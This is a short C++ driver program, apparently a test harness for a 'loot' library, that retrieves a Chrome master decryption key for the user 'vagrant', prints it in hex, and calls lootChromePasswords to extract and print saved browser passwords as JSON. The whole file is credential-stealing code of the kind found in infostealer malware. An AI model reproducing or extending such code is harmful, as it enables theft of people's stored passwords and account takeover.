#include <iostream>
#include "../loot/loot.hpp"

int main() {
	unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];

	getMasterKey(masterKey, "vagrant");
	printUCharAsHex(masterKey, MASTER_KEY_SIZE);

	json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
	std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;

	delete[] masterKey;
	return 0;
}
